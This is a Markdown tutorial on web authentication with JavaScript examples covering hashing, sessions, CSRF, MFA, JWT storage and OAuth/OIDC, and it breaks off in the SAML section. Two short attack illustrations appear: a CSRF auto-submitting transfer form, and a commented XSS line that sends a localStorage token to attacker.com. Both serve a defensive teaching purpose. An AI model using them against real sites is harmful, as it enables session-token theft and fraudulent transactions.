# Authentication

Authentication is the process of verifying the identity of a user, system, or entity. It answers the question "Who are you?" and is fundamental to security in modern applications.

## Table of Contents
- [Introduction](#introduction)
- [Authentication vs Authorization](#authentication-vs-authorization)
- [Authentication Methods](#authentication-methods)
- [Password-Based Authentication](#password-based-authentication)
- [Session Management](#session-management)
- [Multi-Factor Authentication](#multi-factor-authentication)
- [Token-Based Authentication](#token-based-authentication)
- [OAuth 2.0 and OpenID Connect](#oauth-20-and-openid-connect)
- [Single Sign-On (SSO)](#single-sign-on-sso)
- [Biometric Authentication](#biometric-authentication)
- [Authentication Patterns](#authentication-patterns)
- [Authorization](#authorization)
- [Security Best Practices](#security-best-practices)
- [Common Vulnerabilities](#common-vulnerabilities)

---

## Introduction

**What is Authentication?**

Authentication is the process of verifying that someone or something is who they claim to be. It establishes trust between systems and users by validating credentials before granting access to resources.

**Key Concepts:**
- **Identity**: Who or what is requesting access
- **Credentials**: Information used to prove identity
- **Verification**: Process of validating credentials
- **Trust**: Confidence that authentication is reliable

**Common Use Cases:**
- User login to web applications
- API authentication
- Device authentication
- Service-to-service authentication
- Secure communications

---

## Authentication vs Authorization

### Authentication (AuthN)
**Who are you?**

```
User claims: "I am Alice"
System verifies: Username + Password match
Result: Identity confirmed ✓
```

**Focus:** Verifying identity

**Methods:**
- Passwords
- Biometrics
- Certificates
- Tokens

### Authorization (AuthZ)
**What can you do?**

```
User: Authenticated as Alice
System checks: Alice has "admin" role
Result: Access granted to admin panel ✓
```

**Focus:** Granting permissions

**Methods:**
- Role-Based Access Control (RBAC)
- Attribute-Based Access Control (ABAC)
- Access Control Lists (ACL)
- Permissions and scopes

### Example Flow

```
1. Authentication: User logs in with username/password → Identity verified
2. Authorization: System checks user's role → Permissions granted
3. Access: User accesses allowed resources
```

---

## Authentication Methods

### 1. Knowledge-Based (Something You Know)

**Passwords**
```
User: alice
Password: MySecureP@ssw0rd123
```

**PINs (Personal Identification Numbers)**
```
PIN: 4-6 digit code
Used for: ATMs, mobile devices, payment systems
```

**Security Questions**
```
Question: "What is your mother's maiden name?"
Answer: Used as secondary verification
```

### 2. Possession-Based (Something You Have)

**Physical Tokens**
```
- Hardware security keys (YubiKey)
- Smart cards
- RSA tokens
```

**Mobile Devices**
```
- SMS codes
- Authenticator apps (Google Authenticator, Authy)
- Push notifications
```

**Certificates**
```
- X.509 certificates
- Client certificates
- mTLS (Mutual TLS)
```

### 3. Inherence-Based (Something You Are)

**Biometric Authentication**
```
- Fingerprint
- Facial recognition
- Iris scan
- Voice recognition
- Behavioral biometrics
```

### 4. Location-Based (Somewhere You Are)

**Geolocation**
```
- IP address verification
- GPS coordinates
- Geofencing
```

**Network-Based**
```
- VPN requirement
- Internal network access
- IP whitelisting
```

---

## Password-Based Authentication

### Password Storage

**❌ Never Store Plain Text**
```javascript
// WRONG - Never do this!
const user = {
  username: 'alice',
  password: 'MyPassword123'  // Plain text - terrible!
};
```

**✅ Use Proper Password Hashing**
```javascript
const bcrypt = require('bcrypt');

// Hash password during registration
async function hashPassword(plainPassword) {
  const saltRounds = 12;
  const hash = await bcrypt.hash(plainPassword, saltRounds);
  return hash;
}

// Verify password during login
async function verifyPassword(plainPassword, hashedPassword) {
  const match = await bcrypt.compare(plainPassword, hashedPassword);
  return match;
}

// Example
const password = 'MySecureP@ssw0rd';
const hash = await hashPassword(password);
// $2b$12$KIXxLVq5Pq6T8xGvW5kN0OZGpJ...

// Later during login
const isValid = await verifyPassword('MySecureP@ssw0rd', hash);
// true
```

### Argon2 (Modern Alternative)

```javascript
const argon2 = require('argon2');

async function hashPasswordArgon2(password) {
  try {
    const hash = await argon2.hash(password, {
      type: argon2.argon2id,
      memoryCost: 2 ** 16,  // 64 MB
      timeCost: 3,
      parallelism: 1
    });
    return hash;
  } catch (err) {
    throw new Error('Password hashing failed');
  }
}

async function verifyPasswordArgon2(password, hash) {
  try {
    return await argon2.verify(hash, password);
  } catch (err) {
    return false;
  }
}
```

### Password Policy Implementation

```javascript
class PasswordValidator {
  static validate(password) {
    const errors = [];

    // Minimum length
    if (password.length < 12) {
      errors.push('Password must be at least 12 characters');
    }

    // Uppercase letter
    if (!/[A-Z]/.test(password)) {
      errors.push('Password must contain uppercase letter');
    }

    // Lowercase letter
    if (!/[a-z]/.test(password)) {
      errors.push('Password must contain lowercase letter');
    }

    // Number
    if (!/\d/.test(password)) {
      errors.push('Password must contain a number');
    }

    // Special character
    if (!/[!@#$%^&*(),.?":{}|<>]/.test(password)) {
      errors.push('Password must contain special character');
    }

    // Common password check
    const commonPasswords = ['password', '123456', 'qwerty'];
    if (commonPasswords.includes(password.toLowerCase())) {
      errors.push('Password is too common');
    }

    return {
      valid: errors.length === 0,
      errors
    };
  }
}

// Usage
const result = PasswordValidator.validate('MyP@ssw0rd123');
if (!result.valid) {
  console.error('Invalid password:', result.errors);
}
```

### Password Reset Flow

```javascript
const crypto = require('crypto');

class PasswordResetService {
  // Generate reset token
  static generateResetToken() {
    return crypto.randomBytes(32).toString('hex');
  }

  // Create reset token with expiration
  static async createResetToken(userId) {
    const token = this.generateResetToken();
    const expires = new Date(Date.now() + 3600000); // 1 hour

    await db.passwordResets.create({
      userId,
      token: crypto.createHash('sha256').update(token).digest('hex'),
      expires
    });

    return token;
  }

  // Verify reset token
  static async verifyResetToken(token) {
    const hashedToken = crypto.createHash('sha256').update(token).digest('hex');

    const reset = await db.passwordResets.findOne({
      token: hashedToken,
      expires: { $gt: new Date() }
    });

    if (!reset) {
      throw new Error('Invalid or expired token');
    }

    return reset.userId;
  }

  // Complete password reset
  static async resetPassword(token, newPassword) {
    const userId = await this.verifyResetToken(token);
    const hashedPassword = await hashPassword(newPassword);

    await db.users.update(
      { id: userId },
      { password: hashedPassword }
    );

    // Invalidate all reset tokens for this user
    await db.passwordResets.deleteMany({ userId });

    return true;
  }
}
```

---

## Session Management

### Cookie-Based Sessions

```javascript
const express = require('express');
const session = require('express-session');
const RedisStore = require('connect-redis')(session);
const redis = require('redis');

const app = express();
const redisClient = redis.createClient();

// Configure session middleware
app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true,      // HTTPS only
    httpOnly: true,    // Prevent XSS
    maxAge: 3600000,   // 1 hour
    sameSite: 'strict' // CSRF protection
  }
}));

// Login endpoint
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  const user = await db.users.findOne({ username });
  if (!user || !await verifyPassword(password, user.password)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Create session
  req.session.userId = user.id;
  req.session.username = user.username;
  req.session.roles = user.roles;

  res.json({ message: 'Logged in successfully' });
});

// Protected route
app.get('/profile', requireAuth, (req, res) => {
  res.json({
    userId: req.session.userId,
    username: req.session.username
  });
});

// Auth middleware
function requireAuth(req, res, next) {
  if (!req.session.userId) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  next();
}

// Logout
app.post('/logout', (req, res) => {
  req.session.destroy((err) => {
    if (err) {
      return res.status(500).json({ error: 'Logout failed' });
    }
    res.clearCookie('connect.sid');
    res.json({ message: 'Logged out successfully' });
  });
});
```

### Session Storage Options

**Server-Side Storage (Recommended)**
```javascript
// Redis (recommended for distributed systems)
const RedisStore = require('connect-redis')(session);
app.use(session({
  store: new RedisStore({ client: redisClient }),
  // ... config
}));

// MongoDB
const MongoStore = require('connect-mongo');
app.use(session({
  store: MongoStore.create({ mongoUrl: 'mongodb://localhost/sessions' }),
  // ... config
}));

// PostgreSQL
const PostgresStore = require('connect-pg-simple')(session);
app.use(session({
  store: new PostgresStore({ pool: pgPool }),
  // ... config
}));

// Memory Store (development only - NOT for production)
// Default if no store specified - loses sessions on restart
```

**Client-Side Storage (Use with Caution)**
```javascript
// JWT in cookies - stateless sessions
app.use(cookieParser());

function createSessionToken(user) {
  return jwt.sign(
    { userId: user.id, roles: user.roles },
    process.env.SESSION_SECRET,
    { expiresIn: '1h' }
  );
}

app.post('/login', async (req, res) => {
  // ... authenticate user ...

  const token = createSessionToken(user);

  res.cookie('session', token, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 3600000
  });

  res.json({ success: true });
});
```

### Session Security

```javascript
class SessionManager {
  // Regenerate session ID after login
  static regenerateSession(req) {
    return new Promise((resolve, reject) => {
      const oldSession = req.session;
      req.session.regenerate((err) => {
        if (err) return reject(err);

        // Restore session data
        Object.assign(req.session, oldSession);
        resolve();
      });
    });
  }

  // Session timeout handling
  static checkSessionTimeout(req, res, next) {
    if (req.session.lastActivity) {
      const timeout = 30 * 60 * 1000; // 30 minutes
      const now = Date.now();

      if (now - req.session.lastActivity > timeout) {
        req.session.destroy();
        return res.status(401).json({ error: 'Session expired' });
      }
    }

    req.session.lastActivity = Date.now();
    next();
  }

  // Concurrent session control
  static async checkConcurrentSessions(userId, sessionId) {
    const activeSessions = await redis.smembers(`user:${userId}:sessions`);

    // Limit to 3 concurrent sessions
    if (activeSessions.length >= 3 && !activeSessions.includes(sessionId)) {
      throw new Error('Maximum concurrent sessions reached');
    }
  }
}
```

### CSRF Protection

**Understanding CSRF**

Cross-Site Request Forgery attacks trick authenticated users into performing unwanted actions.

```
Attacker's site:
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker" />
  <input name="amount" value="1000" />
</form>
<script>document.forms[0].submit();</script>

If user is logged into bank.com, this auto-submits and transfers money!
```

**CSRF Token Implementation**

```javascript
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

app.use(cookieParser());

// Generate CSRF token
app.get('/form', csrfProtection, (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

// Validate CSRF token
app.post('/process', csrfProtection, (req, res) => {
  // Token automatically validated
  res.json({ success: true });
});
```

**HTML Form with CSRF Token**
```html
<form action="/process" method="POST">
  <input type="hidden" name="_csrf" value="<%= csrfToken %>" />
  <input type="text" name="data" />
  <button type="submit">Submit</button>
</form>
```

**AJAX with CSRF Token**
```javascript
// Include token in request header
fetch('/api/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'CSRF-Token': csrfToken
  },
  body: JSON.stringify({ data: 'value' })
});
```

**SameSite Cookie Attribute**
```javascript
// Modern CSRF protection - prevents cookie sending on cross-site requests
app.use(session({
  cookie: {
    sameSite: 'strict',  // or 'lax' for more flexibility
    secure: true,
    httpOnly: true
  }
}));
```

**Double Submit Cookie Pattern**
```javascript
function generateCSRFToken() {
  return crypto.randomBytes(32).toString('hex');
}

app.use((req, res, next) => {
  if (!req.cookies.csrfToken) {
    const token = generateCSRFToken();
    res.cookie('csrfToken', token, {
      httpOnly: false,  // Must be readable by JavaScript
      secure: true,
      sameSite: 'strict'
    });
  }
  next();
});

app.post('/api/*', (req, res, next) => {
  const cookieToken = req.cookies.csrfToken;
  const headerToken = req.headers['x-csrf-token'];

  if (!cookieToken || cookieToken !== headerToken) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }

  next();
});
```

---

## Multi-Factor Authentication

### Time-Based One-Time Password (TOTP)

```javascript
const speakeasy = require('speakeasy');
const qrcode = require('qrcode');

class TOTPService {
  // Generate secret for new user
  static generateSecret(username) {
    const secret = speakeasy.generateSecret({
      name: `MyApp (${username})`,
      length: 32
    });

    return {
      secret: secret.base32,
      qrCode: secret.otpauth_url
    };
  }

  // Generate QR code
  static async generateQRCode(otpauthUrl) {
    return await qrcode.toDataURL(otpauthUrl);
  }

  // Verify TOTP token
  static verifyToken(secret, token) {
    return speakeasy.totp.verify({
      secret,
      encoding: 'base32',
      token,
      window: 2  // Allow 2 time steps tolerance
    });
  }
}

// Enable 2FA endpoint
app.post('/auth/2fa/enable', requireAuth, async (req, res) => {
  const userId = req.session.userId;
  const user = await db.users.findById(userId);

  // Generate secret
  const { secret, qrCode } = TOTPService.generateSecret(user.username);

  // Store secret temporarily
  await db.users.update(
    { id: userId },
    { totpSecretTemp: secret }
  );

  // Generate QR code
  const qrCodeImage = await TOTPService.generateQRCode(qrCode);

  res.json({ qrCode: qrCodeImage, secret });
});

// Verify and activate 2FA
app.post('/auth/2fa/verify', requireAuth, async (req, res) => {
  const { token } = req.body;
  const userId = req.session.userId;

  const user = await db.users.findById(userId);

  // Verify token
  const isValid = TOTPService.verifyToken(user.totpSecretTemp, token);

  if (!isValid) {
    return res.status(400).json({ error: 'Invalid token' });
  }

  // Activate 2FA
  await db.users.update(
    { id: userId },
    {
      totpSecret: user.totpSecretTemp,
      totpSecretTemp: null,
      twoFactorEnabled: true
    }
  );

  res.json({ message: '2FA enabled successfully' });
});

// Login with 2FA
app.post('/auth/login', async (req, res) => {
  const { username, password, token } = req.body;

  const user = await db.users.findOne({ username });

  // Verify password
  if (!user || !await verifyPassword(password, user.password)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Check if 2FA is enabled
  if (user.twoFactorEnabled) {
    if (!token) {
      return res.status(200).json({
        requiresTwoFactor: true
      });
    }

    // Verify TOTP token
    const isValid = TOTPService.verifyToken(user.totpSecret, token);
    if (!isValid) {
      return res.status(401).json({ error: 'Invalid 2FA token' });
    }
  }

  // Create session
  req.session.userId = user.id;
  res.json({ message: 'Logged in successfully' });
});
```

### SMS-Based 2FA

```javascript
const twilio = require('twilio');

class SMSAuthService {
  constructor() {
    this.client = twilio(
      process.env.TWILIO_ACCOUNT_SID,
      process.env.TWILIO_AUTH_TOKEN
    );
  }

  // Generate 6-digit code
  generateCode() {
    return Math.floor(100000 + Math.random() * 900000).toString();
  }

  // Send SMS code
  async sendCode(phoneNumber, code) {
    await this.client.messages.create({
      body: `Your verification code is: ${code}`,
      from: process.env.TWILIO_PHONE_NUMBER,
      to: phoneNumber
    });
  }

  // Store code with expiration
  async storeCode(userId, code) {
    const expires = Date.now() + 5 * 60 * 1000; // 5 minutes

    await redis.setex(
      `sms:${userId}`,
      300,  // 5 minutes TTL
      JSON.stringify({ code, expires })
    );
  }

  // Verify code
  async verifyCode(userId, submittedCode) {
    const data = await redis.get(`sms:${userId}`);

    if (!data) {
      throw new Error('Code expired or not found');
    }

    const { code, expires } = JSON.parse(data);

    if (Date.now() > expires) {
      await redis.del(`sms:${userId}`);
      throw new Error('Code expired');
    }

    if (code !== submittedCode) {
      throw new Error('Invalid code');
    }

    // Delete code after successful verification
    await redis.del(`sms:${userId}`);
    return true;
  }
}
```

### Backup Codes

```javascript
class BackupCodeService {
  // Generate backup codes
  static generateBackupCodes(count = 10) {
    const codes = [];
    for (let i = 0; i < count; i++) {
      const code = crypto.randomBytes(4).toString('hex').toUpperCase();
      codes.push(code);
    }
    return codes;
  }

  // Hash backup codes before storage
  static async hashCodes(codes) {
    const hashed = [];
    for (const code of codes) {
      const hash = crypto.createHash('sha256').update(code).digest('hex');
      hashed.push(hash);
    }
    return hashed;
  }

  // Generate and store backup codes
  static async createBackupCodes(userId) {
    const codes = this.generateBackupCodes();
    const hashedCodes = await this.hashCodes(codes);

    await db.users.update(
      { id: userId },
      { backupCodes: hashedCodes }
    );

    return codes; // Return plain codes to show user once
  }

  // Use backup code
  static async useBackupCode(userId, code) {
    const user = await db.users.findById(userId);
    const hash = crypto.createHash('sha256').update(code).digest('hex');

    const index = user.backupCodes.indexOf(hash);
    if (index === -1) {
      return false;
    }

    // Remove used code
    user.backupCodes.splice(index, 1);
    await db.users.update(
      { id: userId },
      { backupCodes: user.backupCodes }
    );

    return true;
  }
}
```

---

## Token-Based Authentication

### JWT Authentication

```javascript
const jwt = require('jsonwebtoken');

class JWTAuthService {
  // Generate access token
  static generateAccessToken(user) {
    return jwt.sign(
      {
        userId: user.id,
        username: user.username,
        roles: user.roles
      },
      process.env.JWT_SECRET,
      {
        expiresIn: '15m',
        issuer: 'myapp.com',
        audience: 'myapp-api'
      }
    );
  }

  // Generate refresh token
  static generateRefreshToken(user) {
    return jwt.sign(
      { userId: user.id },
      process.env.JWT_REFRESH_SECRET,
      { expiresIn: '7d' }
    );
  }

  // Verify access token
  static verifyAccessToken(token) {
    try {
      return jwt.verify(token, process.env.JWT_SECRET, {
        issuer: 'myapp.com',
        audience: 'myapp-api'
      });
    } catch (error) {
      throw new Error('Invalid or expired token');
    }
  }

  // Refresh access token
  static async refreshAccessToken(refreshToken) {
    try {
      const payload = jwt.verify(refreshToken, process.env.JWT_REFRESH_SECRET);

      // Check if refresh token is revoked
      const isRevoked = await redis.get(`revoked:${refreshToken}`);
      if (isRevoked) {
        throw new Error('Token revoked');
      }

      const user = await db.users.findById(payload.userId);
      if (!user) {
        throw new Error('User not found');
      }

      return this.generateAccessToken(user);
    } catch (error) {
      throw new Error('Invalid refresh token');
    }
  }
}

// Authentication middleware
function authenticateJWT(req, res, next) {
  const authHeader = req.headers.authorization;

  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'No token provided' });
  }

  const token = authHeader.substring(7);

  try {
    const payload = JWTAuthService.verifyAccessToken(token);
    req.user = payload;
    next();
  } catch (error) {
    return res.status(401).json({ error: 'Invalid token' });
  }
}

// Login endpoint
app.post('/auth/login', async (req, res) => {
  const { username, password } = req.body;

  const user = await db.users.findOne({ username });
  if (!user || !await verifyPassword(password, user.password)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  const accessToken = JWTAuthService.generateAccessToken(user);
  const refreshToken = JWTAuthService.generateRefreshToken(user);

  // Store refresh token
  await db.refreshTokens.create({
    userId: user.id,
    token: refreshToken,
    expires: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)
  });

  res.json({ accessToken, refreshToken });
});

// Refresh endpoint
app.post('/auth/refresh', async (req, res) => {
  const { refreshToken } = req.body;

  try {
    const accessToken = await JWTAuthService.refreshAccessToken(refreshToken);
    res.json({ accessToken });
  } catch (error) {
    res.status(401).json({ error: error.message });
  }
});
```

### Token Storage Strategies

**Comparison of Storage Options:**

| Storage | Security | XSS Risk | CSRF Risk | Accessibility | Best For |
|---------|----------|----------|-----------|---------------|----------|
| **httpOnly Cookie** | ⭐⭐⭐⭐⭐ | Protected | Vulnerable* | Server only | Web apps |
| **Regular Cookie** | ⭐⭐ | Vulnerable | Vulnerable* | Client & Server | Legacy |
| **localStorage** | ⭐⭐ | Vulnerable | Protected | Client only | Never recommended |
| **sessionStorage** | ⭐⭐ | Vulnerable | Protected | Client only | Never recommended |
| **Memory (React state)** | ⭐⭐⭐⭐ | Vulnerable | Protected | Client only | SPAs |

*CSRF risk mitigated with SameSite attribute or CSRF tokens

**1. httpOnly Cookies (Recommended for Web Apps)**

```javascript
// Server-side: Set token in httpOnly cookie
app.post('/auth/login', async (req, res) => {
  const user = await authenticateUser(req.body);
  const accessToken = generateAccessToken(user);
  const refreshToken = generateRefreshToken(user);

  // Access token in httpOnly cookie
  res.cookie('accessToken', accessToken, {
    httpOnly: true,    // Cannot be accessed by JavaScript
    secure: true,      // HTTPS only
    sameSite: 'strict', // CSRF protection
    maxAge: 15 * 60 * 1000 // 15 minutes
  });

  // Refresh token in separate httpOnly cookie
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    path: '/auth/refresh', // Only sent to refresh endpoint
    maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days
  });

  res.json({ success: true });
});

// Client-side: Cookies sent automatically
fetch('/api/data', {
  method: 'GET',
  credentials: 'include' // Important: include cookies
});
```

**2. localStorage (NOT Recommended)**

```javascript
// ❌ Vulnerable to XSS attacks
localStorage.setItem('token', accessToken);

// Any script can read it
const token = localStorage.getItem('token');

// XSS attack example:
// <script>
//   const token = localStorage.getItem('token');
//   fetch('https://attacker.com/steal?token=' + token);
// </script>
```

**3. Memory Storage (Good for SPAs)**

```javascript
// React example - store in state/context
const AuthContext = React.createContext();

function AuthProvider({ children }) {
  const [token, setToken] = useState(null);

  const login = async (credentials) => {
    const response = await fetch('/auth/login', {
      method: 'POST',
      body: JSON.stringify(credentials)
    });

    const { accessToken } = await response.json();
    setToken(accessToken);
  };

  const logout = () => {
    setToken(null);
  };

  return (
    <AuthContext.Provider value={{ token, login, logout }}>
      {children}
    </AuthContext.Provider>
  );
}

// API calls with token
const useAPI = () => {
  const { token } = useContext(AuthContext);

  const fetchData = async () => {
    const response = await fetch('/api/data', {
      headers: {
        'Authorization': `Bearer ${token}`
      }
    });
    return await response.json();
  };

  return { fetchData };
};

// Limitation: Token lost on page refresh
// Solution: Use refresh token in httpOnly cookie
```

**4. Hybrid Approach (Best for SPAs)**

```javascript
// Combine memory storage + httpOnly refresh token
class TokenManager {
  constructor() {
    this.accessToken = null;
  }

  // Store access token in memory
  setAccessToken(token) {
    this.accessToken = token;
  }

  getAccessToken() {
    return this.accessToken;
  }

  // Refresh token stored in httpOnly cookie on server
  async refreshAccessToken() {
    const response = await fetch('/auth/refresh', {
      method: 'POST',
      credentials: 'include' // Send httpOnly cookie
    });

    const { accessToken } = await response.json();
    this.setAccessToken(accessToken);
    return accessToken;
  }

  // Auto-refresh before expiration
  scheduleRefresh(expiresIn) {
    const refreshTime = (expiresIn - 60) * 1000; // Refresh 1 min before expiry
    setTimeout(() => {
      this.refreshAccessToken();
    }, refreshTime);
  }
}

// Usage
const tokenManager = new TokenManager();

// Login
const { accessToken, expiresIn } = await login(credentials);
tokenManager.setAccessToken(accessToken);
tokenManager.scheduleRefresh(expiresIn);

// API calls
fetch('/api/data', {
  headers: {
    'Authorization': `Bearer ${tokenManager.getAccessToken()}`
  }
});
```

**5. Token Rotation**

```javascript
// Server-side token rotation
class TokenRotationService {
  static async rotateRefreshToken(oldRefreshToken) {
    // Verify old token
    const payload = jwt.verify(oldRefreshToken, process.env.JWT_REFRESH_SECRET);

    // Check if token is revoked or reused
    const tokenInfo = await db.refreshTokens.findOne({
      token: hashToken(oldRefreshToken)
    });

    if (!tokenInfo) {
      // Token reuse detected - possible attack
      await this.revokeAllUserTokens(payload.userId);
      throw new Error('Token reuse detected');
    }

    // Mark old token as used
    await db.refreshTokens.update(
      { token: hashToken(oldRefreshToken) },
      { used: true, usedAt: new Date() }
    );

    // Generate new tokens
    const user = await db.users.findById(payload.userId);
    const newAccessToken = generateAccessToken(user);
    const newRefreshToken = generateRefreshToken(user);

    // Store new refresh token
    await db.refreshTokens.create({
      userId: user.id,
      token: hashToken(newRefreshToken),
      expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)
    });

    return { accessToken: newAccessToken, refreshToken: newRefreshToken };
  }

  static async revokeAllUserTokens(userId) {
    await db.refreshTokens.deleteMany({ userId });
  }
}
```

**Security Recommendations:**

```javascript
// ✅ Best Practices
const TOKEN_STORAGE_BEST_PRACTICES = {
  webApps: 'httpOnly cookies with SameSite=strict',
  spas: 'Memory (state) + httpOnly refresh token',
  mobileApps: 'Secure storage (Keychain/Keystore)',

  avoid: [
    'localStorage for tokens',
    'sessionStorage for tokens',
    'Regular cookies for tokens',
    'URL parameters for tokens'
  ],

  additional: [
    'Use short-lived access tokens (15 min)',
    'Implement token rotation',
    'Monitor for token reuse',
    'Revoke tokens on logout',
    'Use HTTPS always',
    'Implement CSRF protection for cookies'
  ]
};
```

---

### API Key Authentication

```javascript
class APIKeyService {
  // Generate API key
  static generateAPIKey() {
    const prefix = 'sk';
    const key = crypto.randomBytes(32).toString('hex');
    return `${prefix}_${key}`;
  }

  // Hash API key for storage
  static hashAPIKey(apiKey) {
    return crypto.createHash('sha256').update(apiKey).digest('hex');
  }

  // Create API key
  static async createAPIKey(userId, name, permissions = []) {
    const apiKey = this.generateAPIKey();
    const hash = this.hashAPIKey(apiKey);

    await db.apiKeys.create({
      userId,
      name,
      hash,
      permissions,
      createdAt: new Date(),
      lastUsed: null
    });

    return apiKey; // Return plain key only once
  }

  // Verify API key
  static async verifyAPIKey(apiKey) {
    const hash = this.hashAPIKey(apiKey);
    const key = await db.apiKeys.findOne({ hash });

    if (!key) {
      throw new Error('Invalid API key');
    }

    // Update last used
    await db.apiKeys.update(
      { id: key.id },
      { lastUsed: new Date() }
    );

    return {
      userId: key.userId,
      permissions: key.permissions
    };
  }

  // Revoke API key
  static async revokeAPIKey(keyId) {
    await db.apiKeys.delete({ id: keyId });
  }
}

// API key middleware
async function authenticateAPIKey(req, res, next) {
  const apiKey = req.headers['x-api-key'];

  if (!apiKey) {
    return res.status(401).json({ error: 'API key required' });
  }

  try {
    const keyInfo = await APIKeyService.verifyAPIKey(apiKey);
    req.apiKey = keyInfo;
    next();
  } catch (error) {
    return res.status(401).json({ error: 'Invalid API key' });
  }
}
```

---

## OAuth 2.0 and OpenID Connect

### OAuth 2.0 Overview

OAuth 2.0 is an **authorization** framework that enables applications to obtain limited access to user accounts. It delegates user authentication to the service hosting the account and authorizes third-party applications.

**Key OAuth 2.0 Flows:**

```javascript
// 1. Authorization Code Flow (most secure, for server-side apps)
const authUrl = `${AUTHORIZATION_URL}?response_type=code&client_id=${CLIENT_ID}&redirect_uri=${REDIRECT_URI}&scope=read write&state=${STATE}`;

// 2. Client Credentials Flow (for machine-to-machine)
const tokenResponse = await fetch(TOKEN_URL, {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: new URLSearchParams({
    grant_type: 'client_credentials',
    client_id: CLIENT_ID,
    client_secret: CLIENT_SECRET
  })
});

// 3. PKCE (Proof Key for Code Exchange) - for mobile/SPA
const codeVerifier = generateCodeVerifier();
const codeChallenge = generateCodeChallenge(codeVerifier);

const authUrl = `${AUTHORIZATION_URL}?response_type=code&client_id=${CLIENT_ID}&code_challenge=${codeChallenge}&code_challenge_method=S256`;
```

**Grant Types Comparison:**

| Grant Type | Use Case | Client Type | Security |
|------------|----------|-------------|----------|
| **Authorization Code** | Web apps | Confidential | ⭐⭐⭐⭐⭐ |
| **Authorization Code + PKCE** | Mobile, SPA | Public | ⭐⭐⭐⭐⭐ |
| **Client Credentials** | Service-to-service | Confidential | ⭐⭐⭐⭐ |
| **Implicit** (deprecated) | SPA | Public | ⭐⭐ |
| **Password** (deprecated) | Legacy | Any | ⭐ |

**Token Types:**

```javascript
// Access Token - short-lived, used to access resources
{
  "access_token": "eyJhbGciOiJIUzI1NiIs...",
  "token_type": "Bearer",
  "expires_in": 3600  // 1 hour
}

// Refresh Token - long-lived, used to obtain new access tokens
{
  "refresh_token": "tGzv3JOkF0XG5Qx2TlKWIA",
  "expires_in": 604800  // 7 days
}
```

**For detailed OAuth 2.0 implementation examples, see [oauth2.md](oauth2.md)**

### OpenID Connect (OIDC)

OpenID Connect is an **authentication** layer built on top of OAuth 2.0. It adds identity verification capabilities to OAuth.

**Key Differences from OAuth 2.0:**

```
OAuth 2.0:  Authorization - "What can you access?"
OIDC:       Authentication + Authorization - "Who are you?" + "What can you access?"
```

**OIDC Tokens:**

```javascript
// ID Token - contains user identity information
{
  "iss": "https://accounts.example.com",
  "sub": "248289761001",
  "aud": "your-client-id",
  "exp": 1516239022,
  "iat": 1516239022,
  "name": "Alice Smith",
  "email": "alice@example.com",
  "email_verified": true
}

// Access Token - same as OAuth 2.0

// Refresh Token - same as OAuth 2.0
```

**OIDC Implementation:**

```javascript
const { Issuer, generators } = require('openid-client');

class OIDCAuth {
  static async initialize() {
    // Discover OIDC configuration
    const issuer = await Issuer.discover('https://accounts.google.com');

    this.client = new issuer.Client({
      client_id: process.env.OIDC_CLIENT_ID,
      client_secret: process.env.OIDC_CLIENT_SECRET,
      redirect_uris: ['https://myapp.com/callback'],
      response_types: ['code']
    });
  }

  // Initiate login
  static getAuthUrl() {
    const codeVerifier = generators.codeVerifier();
    const codeChallenge = generators.codeChallenge(codeVerifier);
    const state = generators.state();

    const authUrl = this.client.authorizationUrl({
      scope: 'openid email profile',
      code_challenge: codeChallenge,
      code_challenge_method: 'S256',
      state
    });

    return { authUrl, codeVerifier, state };
  }

  // Handle callback
  static async handleCallback(callbackParams, codeVerifier, state) {
    // Exchange code for tokens
    const tokenSet = await this.client.callback(
      'https://myapp.com/callback',
      callbackParams,
      { code_verifier: codeVerifier, state }
    );

    // Verify ID token
    const claims = tokenSet.claims();

    // Get additional user info
    const userInfo = await this.client.userinfo(tokenSet.access_token);

    return {
      userId: claims.sub,
      email: claims.email,
      name: claims.name,
      tokens: tokenSet
    };
  }

  // Verify ID token
  static async verifyIdToken(idToken) {
    const tokenSet = await this.client.validateIdToken(idToken);
    return tokenSet.claims();
  }
}
```

**OIDC Scopes:**

```javascript
// Standard OIDC scopes
const scopes = {
  openid: 'Required - indicates OIDC request',
  profile: 'Access to profile info (name, picture, etc.)',
  email: 'Access to email and email_verified',
  address: 'Access to address info',
  phone: 'Access to phone number'
};

// Usage
const authUrl = client.authorizationUrl({
  scope: 'openid email profile'
});
```

**UserInfo Endpoint:**

```javascript
// Fetch additional user information
async function getUserInfo(accessToken) {
  const response = await fetch('https://accounts.example.com/userinfo', {
    headers: {
      'Authorization': `Bearer ${accessToken}`
    }
  });

  return await response.json();
  // {
  //   "sub": "248289761001",
  //   "name": "Alice Smith",
  //   "email": "alice@example.com",
  //   "picture": "https://example.com/photo.jpg"
  // }
}
```

---

## Single Sign-On (SSO)

### SAML 2.0

```javascript
const saml2 = require('saml2-js');

class SAMLService {
  constructor() {
    // Service Provider configuration
    this.sp = new saml2.ServiceProvider({
      entity_id: "https://myapp.com/saml/metadata",
      private_key: fs.readFileSync("sp-key.pem").toString(),
      certificate: fs.readFileSync("sp-cert.pem").toString(),
      assert_endpoint: "https://myapp.com/saml/assert",
      allow_unencrypted_assertion: false
    });

    // Identity Provider configuration
    this.idp = new saml2.IdentityProvider({
      sso_login_url: "https://idp.example.com/saml/login",
      sso_logout_url: "https://idp.example.com/saml/logout",
      certificates: [fs.readFileSync("idp-cert.pem").toString()]
    });
  }

  // Initiate SAML login
  getLoginUrl(req, res) {
